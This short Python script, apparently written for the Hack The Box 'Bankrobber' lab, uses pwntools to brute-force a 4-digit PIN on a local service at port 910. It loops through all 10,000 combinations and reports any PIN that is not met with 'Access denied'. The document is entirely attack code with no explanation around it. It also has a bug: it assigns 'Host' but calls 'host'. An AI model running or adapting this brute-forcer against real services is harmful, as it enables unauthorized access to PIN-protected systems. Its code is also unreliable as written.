# bankrobber pin brute force HTB
from pwn import * 
import itertools

Host = '127.0.0.1'   
port = 910 
numbers = '0123456789'
y = ''

for c in itertools.product(numbers, repeat=4):    
    pin = y+''.join(c)    
    p = remote(host,port)    
    p.recvuntil("[$] ")        
    p.sendline(pin)            
    print pin      
    out = p.recv()            
    if "Access denied" not in out:          
        print "Cracked ->" + pin
